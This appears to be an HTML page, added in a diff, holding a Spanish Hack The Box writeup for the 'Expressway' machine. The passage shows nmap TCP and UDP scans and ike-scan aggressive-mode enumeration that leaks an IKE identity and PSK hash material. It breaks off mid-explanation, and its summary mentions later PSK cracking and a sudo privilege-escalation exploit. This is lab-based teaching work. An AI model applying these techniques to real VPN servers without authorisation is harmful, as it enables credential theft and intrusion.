@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Expressway - Hack The Box · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/htb-writeup-expressway/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Expressway - Hack The Box">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/htb-writeup-expressway/Expressway.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-imagery/">
+          <span class="side-post-card-title">Imagery</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-elCandidato/">
+          <span class="side-post-card-title">El Candidato</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Expressway</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-dragon/">
+          <span class="side-post-card-title">Dragon</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-incertidumbre/">
+          <span class="side-post-card-title">Incertidumbre</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">HackTheBox / Easy Machine</div>
+    
+    <h1>Expressway - Hack The Box</h1>
+    <div class="post-meta">26 September 2025 · 12 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/htb-writeup-expressway/Expressway.png" alt="Expressway - Hack The Box">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina un poco complicada en cuanto a la escalada de privilegios. Después de analizar el escaneo y al no encontrar algún puerto abierto, más que el puerto 22, se realiza un escaneo por UDP, encontrando el puerto 500 abierto que pertenece al protocolo IKE. Analizamos el protocolo IKE con la herramienta ike-scan, logrando obtener un usuario y el hash de la clave PSK, que logramos crackear con la herramienta psk-crack. Al no tener credenciales válidas del atributo XAUTH del protocolo IKE, utilizamos el usuario y la contraseña crackeada de la clave PSK para ganar acceso a la máquina víctima vía SSH. Dentro, no encontramos una vulnerabilidad como tal, hasta que vemos la versión del comando sudo, siendo una versión vulnerable que nos permite escalar privilegios usando el Exploit CVE-2025-32463, siendo así que nos convertimos en Root.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>ike-scan</code></li><li><code>psk-crack</code></li><li><code>ssh</code></li><li><code>sudo</code></li><li><code>id</code></li><li><code>python3</code></li><li><code>wget</code></li><li><code>bash</code></li><li><code>linpeas.sh</code></li><li><code>chmod</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#IKE">Analizando Protocolo IKE</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#PSK">Obtención y Crackeo de PSK y Ganando Acceso a la Máquina Víctima Vía SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#sudo">Explotando Vulnerabilidad de la Versión 1.9.17 de Sudo para Escalar Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#IKE">Analizando Protocolo IKE</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#PSK">Obtención y Crackeo de PSK y Ganando Acceso a la Máquina Víctima Vía SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#sudo">Explotando Vulnerabilidad de la Versión 1.9.17 de Sudo para Escalar Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 10.10.11.87
+</span></span><span style="display:flex;"><span>PING 10.10.11.87 <span style="color:#f92672">(</span>10.10.11.87<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.11.87: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span>69.8 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.11.87: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span>97.1 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.11.87: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span>74.1 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 10.10.11.87 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">3</span> received, 25% packet loss, time 3031ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 69.809/80.330/97.065/11.963 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Linux</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.11.87 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-09-26 12:02 CST
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 12:02
+</span></span><span style="display:flex;"><span>Scanning 10.10.11.87 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.11.87
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:02, 23.37s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.87
+</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.43s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-09-26 12:02:35 CST <span style="color:#66d9ef">for</span> 23s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">34055</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>, <span style="color:#ae81ff">31479</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 23.50 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">113847</span> <span style="color:#f92672">(</span>5.009MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">35191</span> <span style="color:#f92672">(</span>1.408MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Esto es bastante extraño, pues no aparecen más puertos aparte del <strong>puerto 22</strong>.</p>
+<p>Tratemos de escanear los puertos de la máquina víctima vía <strong>UDP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sU --top-ports <span style="color:#ae81ff">1000</span> --open -T5 -vv -n 10.10.11.87 -oN udpScan
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-09-26 12:03 CST
+</span></span><span style="display:flex;"><span>Initiating Ping Scan at 12:03
+</span></span><span style="display:flex;"><span>Scanning 10.10.11.87 <span style="color:#f92672">[</span><span style="color:#ae81ff">4</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed Ping Scan at 12:03, 0.10s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating UDP Scan at 12:03
+</span></span><span style="display:flex;"><span>Scanning 10.10.11.87 <span style="color:#f92672">[</span><span style="color:#ae81ff">1000</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Warning: 10.10.11.87 giving up on port because retransmission cap hit <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Discovered open port 500/udp on 10.10.11.87
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.11.87 from <span style="color:#ae81ff">0</span> to <span style="color:#ae81ff">50</span> due to <span style="color:#ae81ff">11</span> out of <span style="color:#ae81ff">21</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.11.87 from <span style="color:#ae81ff">50</span> to <span style="color:#ae81ff">100</span> due to <span style="color:#ae81ff">11</span> out of <span style="color:#ae81ff">22</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.11.87 from <span style="color:#ae81ff">100</span> to <span style="color:#ae81ff">200</span> due to <span style="color:#ae81ff">11</span> out of <span style="color:#ae81ff">26</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.11.87 from <span style="color:#ae81ff">200</span> to <span style="color:#ae81ff">400</span> due to <span style="color:#ae81ff">11</span> out of <span style="color:#ae81ff">16</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.11.87 from <span style="color:#ae81ff">400</span> to <span style="color:#ae81ff">800</span> due to <span style="color:#ae81ff">11</span> out of <span style="color:#ae81ff">11</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Completed UDP Scan at 12:09, 346.92s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1000</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.87
+</span></span><span style="display:flex;"><span>Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.079s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-09-26 12:03:39 CST <span style="color:#66d9ef">for</span> 346s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">677</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>, <span style="color:#ae81ff">322</span> closed udp ports <span style="color:#f92672">(</span>port-unreach<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>500/udp open  isakmp  udp-response ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 347.49 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">2606</span> <span style="color:#f92672">(</span>122.968KB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">356</span> <span style="color:#f92672">(</span>26.824KB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sU</em></td>
+					<td>Para realizar un escaneo por UDP.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;top-ports</em></td>
+					<td>Para escanear los puertos más comunes.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-T</em></td>
+					<td>Para indicar el tiempo del escaneo de 0 a 5 (entre más rápido, más fácil de detectar).</td>
+			</tr>
+			<tr>
+					<td><em>-v</em></td>
+					<td>Para indicar un verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Muy bien, encontramos el <strong>puerto 500</strong> activo.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<p>Investigando ese puerto, resulta ser del <strong>protocolo IKE</strong>:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Protocolo IKE</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>El puerto UDP 500 se utiliza principalmente para el protocolo IKE (Internet Key Exchange), que es el componente central de IPsec para el establecimiento y la gestión de túneles de VPN seguros a través de Internet. Este puerto permite las negociaciones iniciales, la autenticación y el intercambio de claves de cifrado necesarios antes de que la comunicación VPN se establezca y se transmita.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Usemos un <strong>NSE Script</strong> de <strong>Nmap</strong> para obtener información del <strong>protocolo IKE</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sU -p <span style="color:#ae81ff">500</span> --script ike-version 10.10.11.87
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-09-26 12:11 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.87
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.070s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>500/udp open  isakmp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ike-version: 
+</span></span><span style="display:flex;"><span>|   attributes: 
+</span></span><span style="display:flex;"><span>|     XAUTH
+</span></span><span style="display:flex;"><span>|_    Dead Peer Detection v1.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.58 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>El escaneo nos da algo de información, aunque no pudo detectar la versión de <strong>IKE</strong>, pero sí nos da algunos atributos como:</p>
+<ul>
+<li>El soporte para <strong>XAUTH (Extended Authentication)</strong>, que en resumen el servidor puede requerir un usuario y contraseña (<strong>XAUTH</strong>) para completar la autenticación, además del uso de <strong>PSK</strong>.</li>
+<li>Indica que el equipo <strong>soporta DPD</strong>, que es un protocolo que detecta <strong>peers</strong> caídos y renegocia/limpia <strong>SAs</strong> cuando un peer no responde. Esto es útil para <strong>fingerprinting</strong>.</li>
+</ul>
+<p>Veamos qué más podemos obtener de este protocolo.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="IKE">Analizando Protocolo IKE</h3>
+<p>Ve el siguiente blog que es de bastante ayuda para aplicar pentesting al <strong>protocolo IKE</strong>:</p>
+<ul>
+<li><a href="https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp" target="_blank">IPsec/IKE VPN - Port 500/UDP</a></li>
+</ul>
+<p>Ahí mismo nos indica el uso de la herramienta <strong>ike-scan</strong>, que sirve para el descubrimiento y <strong>huella digital (fingerprint)</strong> de <strong>IKE hosts</strong>.</p>
+<p>La idea principal es poder capturar la <strong>PSK</strong>:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Pre-Shared Key (PSK)</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Es una secreta simétrica (una contraseña/ frase) que ambas partes de una VPN IKE/IPsec conocen de antemano y usan para autenticarse en la Fase 1 (IKE SA). Si el PSK coincide entre cliente y servidor, esa parte de la autenticación pasa; si no, falla con AUTH_FAILED.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Con el modo agresivo de la herramienta <strong>ike-scan</strong>, podemos obtener más información del <strong>protocolo IKE</strong> como una identidad, la propuesta de seguridad (algoritmo de cifrado, tipo de autenticación, etc), el <strong>Vendor ID (VID)</strong>, etc:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike-scan -M -A 10.10.11.87
+</span></span><span style="display:flex;"><span>Starting ike-scan 1.9.6 with <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>http://www.nta-monitor.com/tools/ike-scan/<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10.10.11.87	Aggressive Mode Handshake returned
+</span></span><span style="display:flex;"><span>	HDR<span style="color:#f92672">=(</span>CKY-R<span style="color:#f92672">=</span>93cccecdd5fb5767<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	SA<span style="color:#f92672">=(</span>Enc<span style="color:#f92672">=</span>3DES Hash<span style="color:#f92672">=</span>SHA1 Group<span style="color:#f92672">=</span>2:modp1024 Auth<span style="color:#f92672">=</span>PSK LifeType<span style="color:#f92672">=</span>Seconds LifeDuration<span style="color:#f92672">=</span>28800<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	KeyExchange<span style="color:#f92672">(</span><span style="color:#ae81ff">128</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	Nonce<span style="color:#f92672">(</span><span style="color:#ae81ff">32</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	ID<span style="color:#f92672">(</span>Type<span style="color:#f92672">=</span>ID_USER_FQDN, Value<span style="color:#f92672">=</span>ike@expressway.htb<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	VID<span style="color:#f92672">=</span>09002689dfd6b712 <span style="color:#f92672">(</span>XAUTH<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	VID<span style="color:#f92672">=</span>afcad71368a1f1c96b8696fc77570100 <span style="color:#f92672">(</span>Dead Peer Detection v1.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	Hash<span style="color:#f92672">(</span><span style="color:#ae81ff">20</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ending ike-scan 1.9.6: <span style="color:#ae81ff">1</span> hosts scanned in 0.087 seconds <span style="color:#f92672">(</span>11.49 hosts/sec<span style="color:#f92672">)</span>.  <span style="color:#ae81ff">1</span> returned handshake; <span style="color:#ae81ff">0</span> returned notify
+</span></span></code></pre></div><p>Expliquemos el resultado de este escaneo:</p>
+<ul>
+<li>El host respondió usando <strong>Aggressive Mode (IKEv1)</strong>. Esto es importante porque <strong>Aggressive Mode</strong> suele filtrar/mostrar identidades y deja suficiente material para atacar el <strong>PSK offline</strong>.</li>
+<li><strong>CKY-R</strong> es la cookie (<strong>responder cookie</strong>) enviada por el servidor, que sirve para identificar la <strong>sesión ISAKMP</strong> y prevenir ciertos ataques. No es sensible por sí misma, pero aparece en el <strong>handshake</strong>.</li>
+<li>La propuesta de seguridad que el servidor acepta es:
+<ul>
+<li>Uso del <strong>algoritmo de cifrado 3DES</strong>, que es algo antiguo (<code>Enc=3DES</code>).</li>
